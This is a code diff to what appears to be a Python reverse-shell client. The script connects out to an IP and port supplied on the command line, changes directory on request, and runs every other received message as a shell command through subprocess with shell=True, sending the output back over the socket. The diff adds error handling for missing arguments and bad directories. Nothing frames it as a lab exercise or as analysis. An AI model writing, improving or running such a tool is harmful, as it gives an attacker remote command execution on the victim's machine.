@@ -29,11 +29,15 @@ def session_handler():
              sock.close()
              break
         elif message.split(" ")[0] == 'cd':
-             directory = str(message.split(" ")[1])
-             os.chdir(directory)
-             cur_dir = os.getcwd()
-             print(f'[+] Changed to {cur_dir}')
-             outbound(cur_dir)
+            try:
+                directory = str(message.split(" ")[1])
+                os.chdir(directory)
+                cur_dir = os.getcwd()
+                print(f'[+] Changed to {cur_dir}')
+                outbound(cur_dir)
+            except FileNotFoundError:
+                outbound('Invalid directory. Try again.')
+                continue
         else:
              command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
              output = command.stdout.read() + command.stderr.read()
@@ -41,6 +45,11 @@ def session_handler():
 
 if __name__ == "__main__":
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    host_ip = sys.argv[1]
-    host_port = int(sys.argv[2])
-    session_handler()
+    try:
+        host_ip = sys.argv[1]
+        host_port = int(sys.argv[2])
+        session_handler()
+    except IndexError:
+        print('[-] Command line arguement(s) missing. Please specify IP and Port.')
+    except Exception as e:
+        print(e)
